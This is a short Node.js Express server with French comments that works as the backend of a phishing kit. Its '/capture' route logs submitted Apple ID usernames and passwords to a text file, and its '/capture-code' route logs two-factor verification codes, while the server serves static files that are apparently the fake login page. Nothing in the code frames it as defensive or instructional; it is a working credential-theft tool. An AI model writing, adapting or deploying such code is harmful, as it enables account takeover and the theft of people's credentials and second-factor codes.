const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware pour servir les fichiers statiques et traiter les données POST
app.use(express.static(__dirname));
app.use(bodyParser.json());

// Route pour capturer les identifiants
app.post('/capture', (req, res) => {
    const { interaction, appleId, password } = req.body;
    const filePath = path.join(__dirname, 'captures', 'interactions.txt');
    const logEntry = `${new Date().toISOString()} - ${interaction} - Identifiant : ${appleId}, Mot de passe : ${password}\n`;

    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error('Erreur lors de l\'écriture dans le fichier:', err);
            res.status(500).send('Erreur du serveur');
        } else {
            res.send('Interaction capturée');
        }
    });
});

// Nouvelle route pour capturer le code de vérification
app.post('/capture-code', (req, res) => {
    const { code } = req.body;
    const filePath = path.join(__dirname, 'captures', 'code.txt');
    const logEntry = `${new Date().toISOString()} - Code de vérification : ${code}\n`;

    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error('Erreur lors de l\'écriture dans le fichier:', err);
            res.status(500).send('Erreur du serveur');
        } else {
            res.send('Code de vérification capturé');
        }
    });
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
